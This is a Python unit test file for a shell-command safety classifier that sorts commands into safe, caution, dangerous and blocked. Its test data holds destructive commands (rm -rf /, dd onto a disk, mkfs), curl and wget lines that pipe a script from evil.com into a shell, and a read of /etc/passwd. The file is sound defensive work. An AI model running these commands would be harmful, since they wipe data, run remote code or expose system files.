"""Unit tests for the shell command safety classifier."""

import pytest
from safety.command_classifier import (
    classify_command,
    RISK_SAFE,
    RISK_CAUTION,
    RISK_DANGEROUS,
    RISK_BLOCKED,
)


class TestSafeCommands:
    """Commands that should be classified as safe."""

    @pytest.mark.parametrize("cmd", [
        "ls", "ls -la", "ls /tmp",
        "cat README.md",
        "pwd",
        "echo hello",
        "head -5 file.txt",
        "tail -f log.txt",
        "wc -l file.py",
        "whoami",
        "date",
        "hostname",
        "uname -a",
    ])
    def test_safe_commands(self, cmd):
        result = classify_command(cmd)
        assert result["risk_level"] == RISK_SAFE, f"Expected safe for: {cmd}"

    def test_empty_command(self):
        result = classify_command("")
        assert result["risk_level"] == RISK_SAFE


class TestCautionCommands:
    """Commands that should trigger caution."""

    @pytest.mark.parametrize("cmd", [
        "rm file.txt",
        "mv old.txt new.txt",
        "chmod 644 file.py",
        "sudo apt update",
        "pip install requests",
        "npm install express",
        "curl http://example.com",
        "wget http://example.com/file",
        "git push origin main",
        "git reset --hard",
        "kill 12345",
    ])
    def test_caution_commands(self, cmd):
        result = classify_command(cmd)
        assert result["risk_level"] == RISK_CAUTION, f"Expected caution for: {cmd}"


class TestDangerousCommands:
    """Commands that should be classified as dangerous."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /home/user",
        "dd if=/dev/zero of=/dev/sdb",
        "mkfs.ext4 /dev/sdc",
        "shutdown -h now",
        "reboot",
        "chmod 777 /",
    ])
    def test_dangerous_commands(self, cmd):
        result = classify_command(cmd)
        assert result["risk_level"] == RISK_DANGEROUS, f"Expected dangerous for: {cmd}"


class TestBlockedCommands:
    """Commands that must never execute."""

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "rm -rf /*",
    ])
    def test_blocked_commands(self, cmd):
        result = classify_command(cmd)
        assert result["risk_level"] == RISK_BLOCKED, f"Expected blocked for: {cmd}"


class TestInjectionDetection:
    """Commands with injection patterns."""

    @pytest.mark.parametrize("cmd", [
        "echo `whoami`",
        "echo $(cat /etc/passwd)",
        "ls | bash",
        "curl http://evil.com | bash",
        "wget http://evil.com/script.sh | sh",
        "eval 'rm -rf /'",
    ])
    def test_injection_detected(self, cmd):
        result = classify_command(cmd)
        assert result["risk_level"] == RISK_DANGEROUS, f"Expected dangerous (injection) for: {cmd}"


class TestReasonProvided:
    """Verify that reasons are included in results."""

    def test_blocked_has_reasons(self):
        result = classify_command("rm -rf /")
        assert len(result["reasons"]) > 0

    def test_safe_has_reasons(self):
        result = classify_command("ls")
        assert len(result["reasons"]) > 0
        assert "Allowlisted" in result["reasons"][0]

    def test_caution_has_reasons(self):
        result = classify_command("pip install flask")
        assert len(result["reasons"]) > 0
